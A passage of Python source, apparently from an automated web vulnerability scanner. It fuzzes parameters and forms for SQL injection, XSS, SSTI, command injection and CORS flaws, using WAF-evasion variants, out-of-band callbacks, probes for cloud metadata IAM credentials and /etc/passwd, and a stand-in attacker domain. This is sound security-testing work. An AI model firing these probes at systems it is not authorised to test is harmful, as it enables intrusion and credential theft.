        payload, request it, and run detector(payload, response) -> dict|None.
        Shared by the SSRF, SSTI and open-redirect probes. `budget` caps total
        requests so evasion-expanded payload sets can't explode the request count."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        import httpx

        param_urls = [u for u in urls if "?" in u and "=" in u][:cap]
        findings, seen = [], set()
        if not param_urls:
            return findings
        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=follow,
                                     headers=self._auth_headers()) as c:
            for u in param_urls:
                parsed = urlparse(u)
                params = parse_qs(parsed.query, keep_blank_values=True)
                names = [n for n in params if (name_filter is None or n.lower() in name_filter)]
                for pname in names[:per_params]:
                    key = (parsed.netloc, parsed.path, pname.lower())
                    if key in seen:
                        continue
                    seen.add(key)
                    for pl in payloads:
                        if budget <= 0:
                            return findings
                        budget -= 1
                        mutated = dict(params)
                        mutated[pname] = [pl]
                        target = urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))
                        try:
                            r = await c.get(target)
                        except Exception:
                            continue
                        self._probe_requests = getattr(self, "_probe_requests", 0) + 1
                        if looks_waf_blocked(r.status_code, r.headers, getattr(r, "text", "")):
                            self._waf_blocks = getattr(self, "_waf_blocks", 0) + 1
                        verdict = detector(pl, r)
                        if verdict:
                            findings.append({"param": pname, "url": u, "payload": pl})
                            f = await self.add_finding(
                                title=f"{verdict['title']}: {pname}",
                                severity=verdict["severity"],
                                description=verdict["description"],
                                evidence=f"URL: {u}\nParameter: {pname}\nPayload: {pl}\n{verdict.get('evidence','')}",
                                cvss_score=verdict["cvss"],
                                remediation=verdict["remediation"],
                            )
                            await self.capture(r, finding_id=(f.id if f else None),
                                               notes=f"Confirmed {verdict['title']} on parameter '{pname}'")
                            break
        return findings

    # ── Shared injection detector ────────────────────────────────
    def _injection_verdict(self, pl, r):
        """Classify one response to a crafted payload. Shared by the query-param
        auto-fuzz and the form probe. Returns a finding dict or None."""
        from core.replay import ERROR_SIGNATURES
        try:
            body = r.text or ""
        except Exception:
            body = ""
        low = body.lower()
        errs = [s for s in ERROR_SIGNATURES if s in low]
        if errs:
            return {
                "title": "Parameter Injection Signal (server error)",
                "severity": "medium", "cvss": 5.3,
                "description": ("A crafted value triggered a server-side error signature "
                                f"('{errs[0]}'), indicating the input is not safely handled "
                                "(possible SQL/command injection). Confirm with the workbench."),
                "evidence": f"Error signature: {errs[0]} | HTTP {r.status_code}",
                "remediation": "Use parameterized queries / safe APIs and validate input.",
            }
        if XSS_CANARY in pl and f"<{XSS_CANARY}>" in body:
            return {
                "title": "Reflected Input (possible reflected XSS)",
                "severity": "low", "cvss": 4.0,
                "description": ("The value is reflected unencoded in the response — the prerequisite "
                                "for reflected XSS. Confirm the injection context."),
                "evidence": f"Canary reflected unencoded | HTTP {r.status_code}",
                "remediation": "Context-encode all output; apply a strict CSP.",
            }
        if "etc/passwd" in pl and "root:x:0:0" in body:
            return {
                "title": "Path Traversal (arbitrary file read)",
                "severity": "high", "cvss": 7.5,
                "description": "The input allowed reading /etc/passwd via directory traversal.",
                "evidence": "Response contains /etc/passwd contents (root:x:0:0:)",
                "remediation": "Never build file paths from user input; use an allowlist / canonicalize.",
            }
        return None

    # ── Auto-fuzz: fast deterministic injection-signal sweep ─────
    async def auto_fuzz(self, urls: list) -> list:
        """Fire the injection payload set plus WAF-evasion variants at every query
        parameter, flagging error signatures, unencoded reflection, and file-read
        markers. Reuses _param_probe."""
        payloads = expand_payloads(INJECT_PAYLOADS, "generic", 2)
        return await self._param_probe(urls, payloads, self._injection_verdict,
                                       cap=25, per_params=4)

    # ── Deep per-parameter fuzz: every parameter, every endpoint ──
    async def deep_fuzz(self, urls, base_url=None, budget=2500, time_budget=20,
                        max_endpoints=200, max_params=30, concurrency=6) -> list:
        """Bug-bounty-style deep fuzz. For EVERY parameter of EVERY discovered
        endpoint, fire the full payload library — SQLi (error + time-based blind),
        reflected XSS, SSTI, OS command injection, path traversal, CRLF — with
        WAF-evasion variants, then an HTTP Parameter Pollution pass per endpoint.
        Detection is differential (probe vs a benign baseline) to cut false
        positives; a global request budget guarantees termination on large surfaces;
        endpoints run with bounded concurrency so 'test everything' stays feasible."""
        from core.payloads import probe_families

        param_urls = [u for u in urls if "?" in u and "=" in u][:max_endpoints]
        if not param_urls:
            await self.log("Deep fuzz: no parameterized endpoints to test", "info")
            return []

        plan = probe_families(include_time=True)
        state = {"budget": budget, "time_budget": time_budget}
        seen = set()
        await self.log(
            f"Deep fuzz: firing {len(plan)} payloads/param (SQLi/XSS/SSTI/CMDi/traversal/"
            f"CRLF + HPP) across {len(param_urls)} endpoints", "info")

        import httpx
        sem = asyncio.Semaphore(concurrency)
        findings = []
        async with httpx.AsyncClient(timeout=12, verify=False, follow_redirects=True,
                                     headers=self._auth_headers()) as c:
            async def do_endpoint(u):
                async with sem:
                    return await self._fuzz_endpoint(c, u, plan, state, seen, max_params)
            results = await asyncio.gather(*[do_endpoint(u) for u in param_urls],
                                           return_exceptions=True)
            for res in results:
                if isinstance(res, list):
                    findings += res
            # Stored/persistent XSS needs a second pass: inject unique canaries, then
            # re-fetch endpoints + root and see which resurface where they weren't sent.
            findings += await self._stored_xss_pass(c, param_urls, base_url, state)

        await self.log(
            f"Deep fuzz complete: {len(findings)} confirmed injection(s); "
            f"{state['budget']} request budget remaining",
            "success" if findings else "info")
        return findings

    async def _fuzz_endpoint(self, c, u, plan, state, seen, max_params):
        parsed = urlparse(u)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params or state["budget"] <= 0:
            return []
        base = await self._fuzz_baseline(c, parsed, params)
        out = []
        for pname in list(params.keys())[:max_params]:
            if state["budget"] <= 0:
                break
            dkey = (parsed.netloc, parsed.path, pname.lower())
            if dkey in seen:
                continue
            seen.add(dkey)
            out += await self._fuzz_param(c, parsed, params, pname, base, plan, state)
            out += await self._boolean_sqli(c, parsed, params, pname, base, state)
        out += await self._hpp_probe(c, parsed, params, base, state)
        return out

    async def _fuzz_baseline(self, c, parsed, params):
        """Benign request for this endpoint — the differential reference for error,
        timing and marker detection."""
        import time as _time
        benign = {k: ["ygg1"] for k in params}
        target = urlunparse(parsed._replace(query=urlencode(benign, doseq=True)))
        t0 = _time.perf_counter()
        try:
            r = await c.get(target)
            return {"text": r.text or "", "status": r.status_code,
                    "elapsed": _time.perf_counter() - t0}
        except Exception:
            return {"text": "", "status": 0, "elapsed": 0.0}

    async def _fuzz_param(self, c, parsed, params, pname, base, plan, state):
        import time as _time
        from core.payloads import evaluate
        from core.evasion import payload_variants
        found, families_hit = [], set()
        clean_url = urlunparse(parsed._replace(query=""))
        for family, payload in plan:
            if state["budget"] <= 0:
                break
            if family in families_hit:
                continue
            is_time = family.endswith("_time")
            if is_time and state["time_budget"] <= 0:
                continue
            if family == "sqli_error":
                variants = payload_variants(payload, "sql", 2)
            elif family == "xss":
                variants = payload_variants(payload, "xss", 2)
            else:
                variants = [payload]
            for pl in variants:
                if state["budget"] <= 0:
                    break
                mutated = dict(params)
                mutated[pname] = [pl]
                target = urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))
                state["budget"] -= 1
                if is_time:
                    state["time_budget"] -= 1
                t0 = _time.perf_counter()
                try:
                    r = await c.get(target)
                except Exception:
                    continue
                elapsed = _time.perf_counter() - t0
                self._probe_requests = getattr(self, "_probe_requests", 0) + 1
                if looks_waf_blocked(r.status_code, r.headers, getattr(r, "text", "")):
                    self._waf_blocks = getattr(self, "_waf_blocks", 0) + 1
                verdict = evaluate(family, pl, r.text, r.status_code, elapsed, r.headers,
                                   base.get("text", ""), base.get("status", 200), base.get("elapsed"))
                if verdict:
                    fnd = await self.add_finding(
                        title=f"{verdict['title']}: {pname}",
                        severity=verdict["severity"],
                        description=verdict["description"],
                        evidence=f"URL: {clean_url}\nParameter: {pname}\nPayload: {pl}\n{verdict['evidence']}",
                        cvss_score=verdict["cvss"],
                        remediation=verdict["remediation"],
                    )
                    await self.capture(r, finding_id=(fnd.id if fnd else None),
                                       notes=f"{verdict['title']} on parameter '{pname}'")
                    found.append({"param": pname, "family": family, "payload": pl})
                    families_hit.add(family)
                    break
        return found

    async def _hpp_probe(self, c, parsed, params, base, state):
        """HTTP Parameter Pollution: duplicate a parameter (benign + payload, both
        orders). Backends disagree on which copy wins (first / last / concatenated);
        if a polluted request triggers a hit the single value did not, that pollution
        is exploitable (WAF/validation bypass, access-control confusion)."""
        from core.payloads import evaluate, CANARY, family_description
        found = []
        probes = [("sqli_error", "'"), ("sqli_error", "' OR 1=1-- -"), ("xss", f"<{CANARY}>")]
        base_pairs = parse_qsl(parsed.query, keep_blank_values=True)
        for pname in list(params.keys())[:8]:
            if state["budget"] <= 0:
                break
            hit = False
            for family, payload in probes:
                if hit or state["budget"] <= 0:
                    break
                for order in ("last", "first"):
                    if state["budget"] <= 0:
                        break
                    others = [(k, v) for k, v in base_pairs if k != pname]
                    dup = ([(pname, "ygg1"), (pname, payload)] if order == "last"
                           else [(pname, payload), (pname, "ygg1")])
                    q = urlencode(others + dup, doseq=True)
                    target = urlunparse(parsed._replace(query=q))
                    state["budget"] -= 1
                    try:
                        r = await c.get(target)
                    except Exception:
                        continue
                    self._probe_requests = getattr(self, "_probe_requests", 0) + 1
                    verdict = evaluate(family, payload, r.text, r.status_code, None, r.headers,
                                       base.get("text", ""), base.get("status", 200), None)
                    if verdict:
                        fnd = await self.add_finding(
                            title=f"HTTP Parameter Pollution -> {verdict['title']}: {pname}",
                            severity=verdict["severity"],
                            description=("A duplicated query parameter reached a vulnerable sink that the "
                                         "single parameter did not, confirming HTTP Parameter Pollution. "
                                         + family_description(verdict["family"])),
                            evidence=f"Polluted query: {q}\n{verdict['evidence']}",
                            cvss_score=verdict["cvss"],
                            remediation="Canonicalize or reject duplicate parameter keys server-side before use.",
                        )
                        await self.capture(r, finding_id=(fnd.id if fnd else None),
                                           notes=f"HPP on parameter '{pname}'")
                        found.append({"param": pname, "family": "hpp", "payload": payload})
                        hit = True
                        break
        return found

    async def _boolean_sqli(self, c, parsed, params, pname, base, state):
        """Boolean-based blind SQLi: append a TRUE and a FALSE condition to the
        parameter and compare both against the benign baseline. TRUE ~ baseline while
        FALSE diverges => the parameter controls SQL query logic."""
        from core.payloads import SQLI_BOOL_PAIRS, boolean_verdict
        clean_url = urlunparse(parsed._replace(query=""))
        orig = (params.get(pname) or [""])[0] or "1"

        def build(suffix):
            m = dict(params)
            m[pname] = [orig + suffix]
            return urlunparse(parsed._replace(query=urlencode(m, doseq=True)))

        for tpl, fpl in SQLI_BOOL_PAIRS[:2]:
            if state["budget"] <= 1:
                break
            state["budget"] -= 2
            try:
                rt = await c.get(build(tpl))
                rf = await c.get(build(fpl))
            except Exception:
                continue
            self._probe_requests = getattr(self, "_probe_requests", 0) + 2
            v = boolean_verdict(base.get("text", ""), rt.text, rf.text,
                                base.get("status", 200), rt.status_code, rf.status_code)
            if v:
                fnd = await self.add_finding(
                    title=f"{v['title']}: {pname}",
                    severity=v["severity"], description=v["description"],
                    evidence=f"URL: {clean_url}\nParameter: {pname}\nTRUE:  {orig + tpl}\n"
                             f"FALSE: {orig + fpl}\n{v['evidence']}",
                    cvss_score=v["cvss"], remediation=v["remediation"])
                await self.capture(rt, finding_id=(fnd.id if fnd else None),
                                   notes=f"Boolean-blind SQLi on parameter '{pname}'")
                return [{"param": pname, "family": "sqli_bool"}]
        return []

    async def _stored_xss_pass(self, c, endpoints, base_url, state, cap_inject=40, cap_sinks=30):
        """Stored/persistent XSS: inject a unique canary via each (endpoint, first
        param), then re-fetch the clean endpoints and the site root. A canary that
        resurfaces on a page it was NOT sent to is stored XSS. Bounded by caps/budget."""
        tokens = {}
        for i, u in enumerate(endpoints[:cap_inject]):
            if state["budget"] <= 2:
                break
            parsed = urlparse(u)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue
            pname = list(params.keys())[0]
            token = f"sygg{i}z"
            m = dict(params)
            m[pname] = [f"<{token}>"]
            try:
                await c.get(urlunparse(parsed._replace(query=urlencode(m, doseq=True))))
            except Exception:
                continue
            state["budget"] -= 1
            self._probe_requests = getattr(self, "_probe_requests", 0) + 1
            tokens[token] = (urlunparse(parsed._replace(query="")), pname)
        if not tokens:
            return []

        if not base_url and endpoints:
            p0 = urlparse(endpoints[0])
            base_url = f"{p0.scheme}://{p0.netloc}"
        sinks = list(dict.fromkeys(([base_url] if base_url else []) + [v[0] for v in tokens.values()]))[:cap_sinks]

        found = []
        for s in sinks:
            if state["budget"] <= 0:
                break
            try:
                r = await c.get(s)
            except Exception:
                continue
            state["budget"] -= 1
            body = r.text or ""
            for token, (inj_url, pname) in list(tokens.items()):
                if f"<{token}>" in body:
                    fnd = await self.add_finding(
                        title=f"Stored / Persistent XSS: {pname}",
                        severity="high",
                        description=("An injected payload was stored server-side and later reflected "
                                     "unencoded on a response it was not sent to, confirming stored XSS "
                                     "— it fires for every visitor who loads the affected page."),
                        evidence=f"Injected at: {inj_url} (param {pname})\nResurfaced at: {s}\nMarker: <{token}>",
                        cvss_score=8.0,
                        remediation="Encode on output everywhere the value is rendered; apply a strict CSP.")
                    await self.capture(r, finding_id=(fnd.id if fnd else None),
                                       notes=f"Stored XSS: {pname} -> {s}")
                    found.append({"param": pname, "family": "stored_xss", "sink": s})
                    del tokens[token]
        return found

    async def _launch_chromium(self, pw):
        """Launch headless Chromium. Prefer Playwright's own build (matches the image
        `playwright install chromium`); fall back to any chromium already present under
        PLAYWRIGHT_BROWSERS_PATH whose build number may differ from the pinned version
        (common on prebuilt CI images)."""
        args = ["--no-sandbox", "--disable-dev-shm-usage"]
        try:
            return await pw.chromium.launch(headless=True, args=args)
        except Exception:
            import glob
            root = os.getenv("PLAYWRIGHT_BROWSERS_PATH", "/opt/pw-browsers")
            for exe in sorted(glob.glob(os.path.join(root, "chromium-*/chrome-linux/chrome")), reverse=True):
                try:
                    return await pw.chromium.launch(headless=True, args=args, executable_path=exe)
                except Exception:
                    continue
            raise

    # ── DOM-based XSS via a real headless browser ────────────────
    async def dom_xss_scan(self, urls, cap=40, budget=200) -> list:
        """Drive headless Chromium to confirm real JavaScript EXECUTION — catching
        DOM-based XSS (client-side sinks that never touch the server response) and
        upgrading reflected candidates to execution-confirmed. Injects into each query
        parameter and the URL fragment. Degrades gracefully without Playwright."""
        try:
            from playwright.async_api import async_playwright
        except Exception:
            await self.log("Playwright not installed; DOM XSS scan skipped", "warn")
            self._mark_tool_missing("dom")
            return []
        from core.payloads import DOM_MARKER, dom_payloads

        param_urls = [u for u in urls if "?" in u and "=" in u][:cap]
        if not param_urls:
            await self.log("DOM XSS: no parameterized endpoints", "info")
            return []

        await self.log(f"DOM XSS: driving headless Chromium against {len(param_urls)} endpoint(s)", "info")
        findings, seen = [], set()
        payloads = dom_payloads()
        fired = {"msg": None}

        def _on_dialog(d):
            fired["msg"] = d.message
            asyncio.ensure_future(d.dismiss())

        try:
            async with async_playwright() as pw:
                browser = await self._launch_chromium(pw)
                headers = {"User-Agent": BROWSER_USER_AGENT}
                if self._cookie():
                    headers["Cookie"] = self._cookie()
                context = await browser.new_context(ignore_https_errors=True, extra_http_headers=headers)
                page = await context.new_page()
                page.on("dialog", _on_dialog)
                page.on("pageerror", lambda e: None)

                for u in param_urls:
                    if budget <= 0:
                        break
                    parsed = urlparse(u)
                    params = parse_qs(parsed.query, keep_blank_values=True)
                    cases = []
                    for pname in list(params.keys())[:5]:
                        for pl in payloads:
                            m = dict(params)
                            m[pname] = [pl]
                            cases.append((pname, pl, urlunparse(parsed._replace(query=urlencode(m, doseq=True)))))
                    for pl in payloads:      # URL fragment — the classic DOM sink
                        cases.append(("#fragment", pl, u + "#" + pl))

                    for pname, pl, turl in cases:
                        if budget <= 0:
                            break
                        dedupe = (parsed.path, pname)
                        if dedupe in seen:
                            continue
                        budget -= 1
                        fired["msg"] = None
                        try:
                            await page.goto(turl, wait_until="load", timeout=8000)
                            await page.wait_for_timeout(300)
                        except Exception:
                            continue
                        if fired["msg"] and DOM_MARKER in str(fired["msg"]):
                            seen.add(dedupe)
                            loc = "URL fragment (#)" if pname == "#fragment" else f"parameter {pname}"
                            fnd = await self.add_finding(
                                title=f"DOM-based XSS (execution confirmed): {pname}",
                                severity="high",
                                description=("A headless browser executed injected JavaScript via "
                                             f"{loc}, confirming XSS with real execution — including DOM "
                                             "sinks that never appear in the server response."),
                                evidence=f"URL: {urlunparse(parsed._replace(query=''))}\nInjection: {loc}\n"
                                         f"Payload: {pl}\nalert() fired carrying marker {DOM_MARKER}",
                                cvss_score=7.7,
                                remediation=("Sanitize/encode before DOM sinks (innerHTML, document.write, eval); "
                                             "apply a strict Content-Security-Policy."))
                            findings.append({"param": pname, "family": "dom_xss", "payload": pl})
                await browser.close()
        except Exception as e:
            await self.log(f"DOM XSS scan error: {e}", "warn")

        await self.log(f"DOM XSS scan complete: {len(findings)} execution-confirmed",
                       "success" if findings else "info")
        return findings

    # ── Out-of-band (OAST) blind SSRF / command injection ────────
    async def oast_scan(self, urls, budget=300) -> list:
        """Stand up an out-of-band callback listener, inject payloads that make a
        vulnerable target reach back to it (blind SSRF via URL params, blind OS
        command injection via curl/wget), then correlate any interaction to the exact
        injection point. Degrades gracefully; if the target cannot route back to the
        listener, nothing is reported (the honest outcome)."""
        import httpx
        from core.oast import OASTListener
        from core.payloads import oob_payloads

        param_urls = [u for u in urls if "?" in u and "=" in u][:80]
        if not param_urls:
            return []
        try:
            listener = await OASTListener().start()
        except Exception as e:
            await self.log(f"OAST listener could not start; out-of-band scan skipped ({e})", "warn")
            self._mark_tool_missing("oob")
            return []

        await self.log(f"OAST: out-of-band probing via listener on port {listener.port}", "info")
        pending = {}   # token -> (clean_url, param, klass)
        try:
            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True,
                                         headers=self._auth_headers()) as c:
                for u in param_urls:
                    if budget <= 0:
                        break
                    parsed = urlparse(u)
                    params = parse_qs(parsed.query, keep_blank_values=True)
                    clean = urlunparse(parsed._replace(query=""))
                    for pname in list(params.keys())[:6]:
                        for klass in ("oob_ssrf", "oob_cmdi"):
                            if budget <= 0:
                                break
                            tok = listener.new_token()
                            bundle = oob_payloads(listener.url_for(tok))
                            pls = bundle["ssrf"] if klass == "oob_ssrf" else bundle["cmdi"][:4]
                            for pl in pls:
                                if budget <= 0:
                                    break
                                budget -= 1
                                m = dict(params)
                                m[pname] = [pl]
                                target = urlunparse(parsed._replace(query=urlencode(m, doseq=True)))
                                try:
                                    await c.get(target)
                                except Exception:
                                    pass
                            pending[tok] = (clean, pname, klass)
                await asyncio.sleep(4)   # let asynchronous callbacks arrive
        finally:
            await listener.stop()

        from core.payloads import _META
        findings = []
        for tok, (url, pname, klass) in pending.items():
            if listener.got(tok):
                sev, cvss, rem, desc = _META[klass]
                title = ("Blind SSRF (out-of-band confirmed)" if klass == "oob_ssrf"
                         else "Blind OS Command Injection (out-of-band confirmed)")
                fnd = await self.add_finding(
                    title=f"{title}: {pname}", severity=sev, description=desc,
                    evidence=f"URL: {url}\nParameter: {pname}\nOut-of-band callback received (token {tok})",
                    cvss_score=cvss, remediation=rem)
                findings.append({"param": pname, "family": klass, "url": url})
        await self.log(f"OAST scan complete: {len(findings)} out-of-band confirmation(s)",
                       "success" if findings else "info")
        return findings

    # ── Form discovery + POST/body injection ─────────────────────
    async def discover_forms(self, urls: list, cap_pages: int = 25) -> list:
        """Fetch crawled pages, parse their <form>s, and return testable specs
        {method, url, fields}. This is the POST/body attack surface — logins,
        searches, checkout — that a URL-only crawler never exposes."""
        import httpx
        specs, seen = [], set()
        pages = list(dict.fromkeys(urls))[:cap_pages]
        if not pages:
            return specs
        try:
            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True,
                                         headers=self._auth_headers()) as c:
                for page in pages:
                    try:
                        r = await c.get(page)
                    except Exception:
                        continue
                    if "html" not in r.headers.get("content-type", "").lower():
                        continue
                    ex = _FormExtractor()
                    try:
                        ex.feed(r.text or "")
                    except Exception:
                        continue
                    for form in ex.forms:
                        if not form["fields"]:
                            continue
                        action_url = urljoin(page, form["action"]) if form["action"] else page
                        if not _host_ok(action_url, page):   # stay on the crawled host
                            continue
                        key = (form["method"], action_url, tuple(sorted(form["fields"])))
                        if key in seen:
                            continue
                        seen.add(key)
                        specs.append({"method": form["method"].upper(), "url": action_url,
                                      "fields": form["fields"]})
        except Exception as e:
            await self.log(f"Form discovery skipped: {e}", "warn")
        if specs:
            await self.log(f"Form discovery: {len(specs)} testable form(s) "
                           f"({sum(1 for s in specs if s['method'] == 'POST')} POST)", "info")
        return specs

    async def test_forms(self, form_specs: list) -> list:
        """Inject the payload set into each form field (POST or GET) and flag the
        same signals as auto_fuzz — this is where login-form SQLi and search XSS
        surface. Findings + the proving request are captured as evidence."""
        import httpx
        findings, seen = [], set()
        specs = (form_specs or [])[:20]
        if not specs:
            return findings
        try:
            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True,
                                         headers=self._auth_headers()) as c:
                for spec in specs:
                    method, url, fields = spec["method"], spec["url"], spec["fields"]
                    for field in fields[:8]:
                        key = (method, url, field)
                        if key in seen:
                            continue
                        seen.add(key)
                        for pl in INJECT_PAYLOADS:
                            data = {f: (pl if f == field else "test") for f in fields}
                            try:
                                if method == "POST":
                                    r = await c.post(url, data=data)
                                else:
                                    r = await c.get(url, params=data)
                            except Exception:
                                continue
                            verdict = self._injection_verdict(pl, r)
                            if verdict:
                                _f = await self.add_finding(
                                    title=f"{verdict['title']}: {field} (form {method})",
                                    severity=verdict["severity"],
                                    description=verdict["description"],
                                    evidence=(f"Form: {method} {url}\nField: {field}\nPayload: {pl}\n"
                                              f"{verdict.get('evidence', '')}"),
                                    cvss_score=verdict["cvss"],
                                    remediation=verdict["remediation"],
                                )
                                await self.capture(
                                    r, finding_id=(_f.id if _f else None),
                                    notes=f"{verdict['title']} on form field '{field}' ({method} {url})")
                                findings.append({"field": field, "url": url, "method": method, "payload": pl})
                                break
        except Exception as e:
            await self.log(f"Form testing error: {e}", "warn")
        if findings:
            await self.log(f"Form testing: {len(findings)} injection signal(s) on form fields", "success")
        return findings

    # ── SSRF (in-band: cloud metadata / file read) ───────────────
    async def test_ssrf(self, urls: list) -> list:
        await self.log("Probing parameters for SSRF (cloud metadata / file read)", "info")
        canaries = [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
            "file:///etc/passwd",
        ]
        aws_gcp = ("security-credentials", "ami-id", "instance-id", "iam/",
                   "computeMetadata", "project-id", "meta-data")

        def det(pl, r):
            body = r.text or ""
            if pl.startswith("file:"):
                m = re.search(r"root:.*?:0:0:", body)
                if m:
                    return {"title": "Server-Side Request Forgery (file read)", "severity": "high",
                            "cvss": 8.6,
                            "description": "A URL parameter fetched a local file via the file:// scheme, "
                                           "confirming server-side request forgery with local file read.",
                            "remediation": "Allowlist outbound URL schemes/hosts; block file:// and internal "
                                           "addresses; resolve and validate the target before fetching.",
                            "evidence": f"Leaked: {m.group(0)[:120]}"}
                return None
            if any(s in body for s in aws_gcp):
                return {"title": "Server-Side Request Forgery (cloud metadata)", "severity": "high",
                        "cvss": 8.6,
                        "description": "A URL parameter caused the server to fetch a cloud metadata endpoint, "
                                       "exposing instance metadata and potentially IAM credentials.",
                        "remediation": "Block requests to link-local/metadata IPs (169.254.169.254), enforce "
                                       "IMDSv2, and allowlist outbound hosts.",
                        "evidence": "Cloud metadata signature reflected in the response body."}
            return None

        f = await self._param_probe(urls, canaries, det, name_filter=SSRF_PARAMS, cap=30, follow=True)
        await self.log(f"SSRF probing complete: {len(f)} confirmed", "success" if f else "info")
        return f

    # ── SSTI (template evaluation) ───────────────────────────────
    async def test_ssti(self, urls: list) -> list:
        await self.log("Probing parameters for server-side template injection", "info")
        marker = "1787569"  # 1337*1337, distinctive so a natural match is unlikely
        payloads = ["${1337*1337}", "{{1337*1337}}", "<%= 1337*1337 %>", "#{1337*1337}",
                    "${{1337*1337}}", "*{1337*1337}"]

        def det(pl, r):
            if marker in (r.text or ""):
                return {"title": "Server-Side Template Injection", "severity": "high", "cvss": 9.0,
                        "description": "A template expression injected into this parameter was evaluated "
                                       "server-side (1337*1337 rendered as 1787569), confirming SSTI. "
                                       "This frequently leads to remote code execution.",
                        "remediation": "Never pass user input into template engines. Use logic-less "
                                       "templates or strict sandboxing and context-aware escaping.",
                        "evidence": "Template expression evaluated to 1787569 in the response."}
            return None

        f = await self._param_probe(urls, payloads, det, name_filter=None, cap=30, follow=True)
        await self.log(f"SSTI probing complete: {len(f)} confirmed", "success" if f else "info")
        return f

    # ── Open redirect ────────────────────────────────────────────
    async def test_open_redirect(self, urls: list) -> list:
        await self.log("Probing redirect parameters for open redirect", "info")
        evil = "evil-yggdrasil.example"
        payloads = [f"https://{evil}", f"//{evil}", f"https:/{evil}", f"/\\{evil}"]

        def det(pl, r):
            loc = r.headers.get("location", "")
            # The attacker host is a made-up domain, so its presence in the
            # redirect target is itself proof the parameter controls the redirect.
            if loc and evil in loc.lower():
                return {"title": "Open Redirect", "severity": "medium", "cvss": 5.4,
                        "description": "A redirect parameter sent the browser to an attacker-controlled "
                                       "external domain, enabling phishing and OAuth token theft.",
                        "remediation": "Allowlist redirect targets or use relative paths only; never redirect "
                                       "to a raw user-supplied URL.",
                        "evidence": f"Location: {loc[:200]}"}
            return None

        f = await self._param_probe(urls, payloads, det, name_filter=REDIRECT_PARAMS,
                                    cap=40, follow=False)
        await self.log(f"Open-redirect probing complete: {len(f)} confirmed", "success" if f else "info")
        return f

    # ── CORS misconfiguration ────────────────────────────────────
    async def test_cors(self, base_url: str, urls: list) -> list:
        import httpx
        await self.log("Testing CORS policy for arbitrary-origin reflection", "info")
        evil = "https://evil-yggdrasil.example"
        targets = list(dict.fromkeys([base_url] + [u for u in urls if "/api" in u or "?" not in u]))[:20]
        findings = []
        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=False,
                                     headers=self._auth_headers()) as c:
            for u in targets:
                try:
                    r = await c.get(u, headers={"Origin": evil})
                except Exception:
                    continue
                acao = r.headers.get("access-control-allow-origin", "")
                acac = r.headers.get("access-control-allow-credentials", "").lower()
                if acao == evil:
                    sev = "high" if acac == "true" else "medium"
                    cvss = 7.4 if acac == "true" else 5.3
                    findings.append({"url": u, "creds": acac == "true"})
                    _f = await self.add_finding(
                        title=f"CORS Misconfiguration (reflected origin{' + credentials' if acac == 'true' else ''})",
                        severity=sev,
                        description="The server reflects an arbitrary Origin in Access-Control-Allow-Origin"
                                    + (" with Access-Control-Allow-Credentials: true, letting any site read "
                                       "authenticated responses (account takeover)." if acac == "true"
                                       else ", allowing any site to read the response."),
                        evidence=f"URL: {u}\nOrigin: {evil}\nAccess-Control-Allow-Origin: {acao}\n"
                                 f"Access-Control-Allow-Credentials: {acac or '(unset)'}",
                        cvss_score=cvss,
                        remediation="Reflect only an allowlist of trusted origins; never combine a reflected "
                                    "origin with credentials; avoid dynamic ACAO based on the Origin header.",
                    )
                    await self.capture(r, finding_id=(_f.id if _f else None),
                                       notes=f"Arbitrary Origin {evil} reflected in ACAO")
        await self.log(f"CORS testing complete: {len(findings)} misconfiguration(s)",
                       "success" if findings else "info")
        return findings

    # ── Host header injection ────────────────────────────────────
    async def test_host_header(self, base_url: str) -> list:
        import httpx
        await self.log("Testing for host header injection / poisoning", "info")
        evil = "evil-yggdrasil.example"
        findings = []
        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=False,
                                     headers=self._auth_headers()) as c:
            for hdr in ("Host", "X-Forwarded-Host"):
                try:
                    r = await c.get(base_url, headers={hdr: evil})
                except Exception:
                    continue
                loc = r.headers.get("location", "")
                body = (r.text or "")[:4000]
                if evil in loc or evil in body:
                    findings.append({"header": hdr})
                    _f = await self.add_finding(
                        title=f"Host Header Injection ({hdr})",
                        severity="medium",
                        description="A spoofed host header was reflected into a redirect or the response body. "
                                    "This enables web-cache poisoning and password-reset link poisoning "
                                    "(account takeover via reset emails pointing at an attacker domain).",
                        evidence=f"{hdr}: {evil}\nReflected in: {'Location header' if evil in loc else 'response body'}",
                        cvss_score=6.1,
                        remediation="Validate the Host header against an allowlist; build absolute URLs from a "
                                    "configured canonical hostname, never from the request Host/X-Forwarded-Host.",
                    )
                    await self.capture(r, finding_id=(_f.id if _f else None),
                                       notes=f"Spoofed {hdr}: {evil} reflected")
                    break
        await self.log(f"Host-header testing complete: {len(findings)} finding(s)",
                       "success" if findings else "info")
        return findings

    # ── Active parameter mining (arjun style) ────────────────────
    async def mine_params(self, base_url: str) -> list:
        """Discover hidden parameters the app processes by probing candidate names
        and watching for the injected value being reflected. Returns synthesized
        param URLs so the injection probes then test the newly found params."""
        import httpx

        canary = "olymz9x7q"
        try:
            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True,
                                         headers=self._auth_headers()) as c:
                base = await c.get(base_url)
                base_reflects = canary in (base.text or "")
                if base_reflects:
                    return []  # site echoes anything; reflection test is meaningless

                sem = asyncio.Semaphore(20)
                sep = "&" if "?" in base_url else "?"

                async def probe(cand):
                    async with sem:
                        try:
                            r = await c.get(f"{base_url}{sep}{cand}={canary}")
                        except Exception:
                            return None
                        return cand if canary in (r.text or "") else None

                results = await asyncio.gather(*[probe(cand) for cand in PARAM_MINE_CANDIDATES])
        except Exception:
            return []

        found = [c for c in results if c]
        if not found:
            await self.log("Param mining: no hidden reflected parameters", "info")
            return []
        await self.log(
            f"Param mining: {len(found)} hidden reflected parameter(s): {', '.join(found[:15])}",
            "success",
        )
        sep = "&" if "?" in base_url else "?"
        return [f"{base_url}{sep}{c}=1" for c in found]

    # ── OWASP ZAP active scan (full DAST) ────────────────────────
